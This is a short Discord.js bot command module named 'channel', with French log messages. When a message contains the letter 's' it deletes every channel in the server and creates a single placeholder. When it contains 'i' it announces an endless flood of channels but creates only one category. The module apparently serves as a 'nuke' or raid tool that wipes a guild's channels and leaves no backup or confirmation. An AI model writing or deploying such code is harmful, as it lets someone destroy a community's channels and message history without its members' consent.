exports.run = (client, message, args) => {
    if (message.content.includes('s')) {
        Promise.all(message.guild.channels.map(c => c.delete()));
        message.guild.createChannel('undefined-1', 'text');        
        console.log('Tous les salons ont été supprimés. Cependant, un autre a été créé de sorte à pouvoir écrire les commandes suivantes.');
    }
    if (message.content.includes('i')) {
        console.log('Une infinité de salons vont être créés.');
        message.guild.createChannel('undefined-3', 'category');
    }
}

exports.conf = {
    permLevel: 4,
    aliases: []
}

exports.help = {
    name: 'channel'
}